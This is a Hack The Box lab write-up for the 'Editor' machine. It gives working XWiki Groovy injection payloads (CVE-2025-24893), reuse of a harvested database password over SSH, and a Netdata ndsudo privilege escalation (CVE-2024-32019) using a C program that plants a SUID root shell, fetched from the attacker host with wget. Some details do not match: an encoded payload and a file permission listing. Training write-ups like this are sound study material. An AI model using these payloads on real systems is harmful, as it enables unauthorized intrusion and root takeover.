
# #HTB 


![[Pasted image 20260109225646.png|281]]


# HTB: Editor

**Machine IP:** `10.10.11.80`  
**Difficulty:** Easy 
**OS:** Linux


---


## Tools Used
- `rustscan` / `nmap` - Port discovery
- `ffuf` - Subdomain enumeration
- `curl` / Burp Suite - SSTI exploitation
- `python3 -m http.server` - File transfer
- `nc` - Reverse shell listener
- `gcc` - SUID binary compilation
- `netexec` - SSH credential testing


---


## Step 1: Reconnaissance - Port Scanning

### RustScan Results

**Open ports discovered:**
- Port 22 (SSH)
- Port 80 (HTTP)
![[Pasted image 20260109231134.png]]

### Service Version Scan

```
sudo nmap 10.10.11.80 -sV -p 22,80
```

**Results:**

| Port   | Service | Version              |
| ------ | ------- | -------------------- |
| 22/tcp | SSH     | OpenSSH 8.9p1 Ubuntu |
| 80/tcp | HTTP    | Apache (Ubuntu)      |





## Step 2: Web Enumeration - Subdomain Discovery

### FFUF Subdomain Scanning

```
ffuf -w subdomains-top1mil-20000.txt -u http://editor.htb -H "Host: FUZZ.editor.htb" -fs 154
```


![[Pasted image 20260109231941.png]]
**Discovered subdomain:**
```
wiki    [Status: 302, Size: 0]
```


### XWiki Login Page

Navigating to `http://wiki.editor.htb/xwiki/bin/login` reveals an **XWiki** instance (version 15.10.8).

![[Pasted image 20260109232010.png]]



## Step 3: Vulnerability Discovery - SSTI in XWiki

### CVE-2025-24893 Background

Research revealed a known SSTI (Server-Side Template Injection) vulnerability in XWiki that allows Groovy script execution.

### SSTI Confirmation Payload

The following payload was crafted to test Groovy execution:
```
}}){async async=false}}{{groovy}}println("Hello from search text:42"){{/groovy}}{{/async}}
```

**SSTI is CONFIRMED!**
**URL-encoded payload:**

%7d%7d%7d%7b%7b%61%73%79%6e%63%20%61%73%79%6e%63%3d%66%61%6c%73%65%7d%7d%7b%7b%67%72%6f%6f%76%79%7d%7d%70%72%69%6e%74%6c%6e%28%22%69%64%22%2e%65%78%65%63%75%74%65%28%29%2e%74%65%78%74%29%7b%7b%2f%67%72%6f%6f%76%79%7d%7d%7b%7b%2f%61%73%79%6e%63%7d%7d


**Request:**
![[Pasted image 20260110001745.png]]





## Step 4: Exploitation - Command Execution

### Execute System Commands

Payload to run `id` command:
```
}}){async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}
```

URL-encoded:
```
%7d%7d%7d%7b%7b%61%73%79%6e%63%20%61%73%79%6e%63%3d%66%61%6c%73%65%7d%7d%7b%7b%67%72%6f%6f%76%79%7d%7d%70%72%69%6e%74%6c%6e%28%22%69%64%22%2e%65%78%65%63%75%74%65%28%29%2e%74%65%78%74%29%7b%7b%2f%67%72%6f%6f%76%79%7d%7d%7b%7b%2f%61%73%79%6e%63%7d%7d
```

![[Pasted image 20260110001846.png]]
**Result:**
```
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
```





## Step 5: Reverse Shell as xwiki

### Stage 1 - Download Reverse Shell Script

Payload to download reverse shell:

![[Pasted image 20260110012432.png]]


![[Pasted image 20260110012536.png]]


![[Pasted image 20260110012845.png]]




### Start HTTP Server & Listener

### Reverse Shell Received

![[Pasted image 20260507004711.png]]

![[Pasted image 20260507004722.png]]


![[Pasted image 20260110012910.png]]





## Step 6: Credential Extraction

### Database Configuration

![[Pasted image 20260110013601.png]]

**Credentials found:**
```
<property name="hibernate.connection.username">xwiki</property>
<property name="hibernate.connection.password">theEd1tOrTeam99</property>
```

![[Pasted image 20260110013840.png]]



![[Pasted image 20260110014146.png]]





## Step 7: SSH Access as Oliver

### Testing Credentials

```
netexec ssh editor.htb -u oliver -p theEd1tOrTeam99
```

**Result:** `[+] oliver:theEd1tOrTeam99 - Linux shell access!`

![[Pasted image 20260110014200.png]]


### SSH Login

```
ssh oliver@editor.htb
# Password: theEd1tOrTeam99
```

![[Pasted image 20260110014341.png]]



### User Flag

```
oliver@editor:~$ cat /home/oliver/user.txt
```

![[Pasted image 20260110014447.png]]


- user.txt ->
![[Pasted image 20260110014838.png]]






## Step 8: Privilege Escalation - Netdata

### Service Discovery

```
oliver@editor:~$ ss -tnl
```

![[Pasted image 20260110021115.png]]


![[Pasted image 20260110021138.png]]



**Interesting port:** `127.0.0.1:19999` (Netdata monitoring service)

![[Pasted image 20260110021217.png]]


**Version:** `v1.45.2` (Vulnerable)
![[Pasted image 20260110021519.png]]


![[Pasted image 20260110021728.png]]


### Vulnerability: CVE-2024-32019

Netdata allows `ndsudo` (a SUID binary) to run certain commands with root privileges.

```
oliver@editor:~$ ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rw-r-x--- 1 root netdata 200576 Apr 1 2024 ndsudo
```

![[Pasted image 20260110022216.png]]






## Step 9: Root Exploitation

### Create SUID Binary Payload

**root.c:**
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf");
    return 0;
}

```


### Compile and Transfer
```
# Attacker machine
gcc root.c -o nvme

# Start HTTP server
python3 -m http.server 80
```

![[Pasted image 20260110022830.png]]



```
# On target (as oliver)
oliver@editor:/tmp$ wget http://10.10.14.53/nvme
oliver@editor:/tmp$ chmod +x nvme
```

![[Pasted image 20260110022905.png]]



### Execute via ndsudo

```
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo /tmp/nvme
```


### Root Shell
```
oliver@editor:/tmp$ /tmp/0xdf -p
0xdf-5.1# cat /root/root.txt
```
![[Pasted image 20260110023322.png]]






## Step 10: Machine Owned

![[Pasted image 20260110023352.png]]



## Flags

|Flag|Value|
|---|---|
|User|`(found in /home/oliver/user.txt)`|
|Root|`(found in /root/root.txt)`|


---

## Attack Chain Summary
```
Port Scan (22,80)
       ↓
Subdomain Discovery (wiki.editor.htb)
       ↓
XWiki SSTI (CVE-2025-24893)
       ↓
Groovy Code Execution → Reverse Shell as xwiki
       ↓
Extract DB Creds (theEd1tOrTeam99)
       ↓
SSH as oliver
       ↓
Netdata Enumeration (v1.45.2)
       ↓
CVE-2024-32019 → ndsudo SUID Abuse
       ↓
Custom SUID Binary → Root Shell
```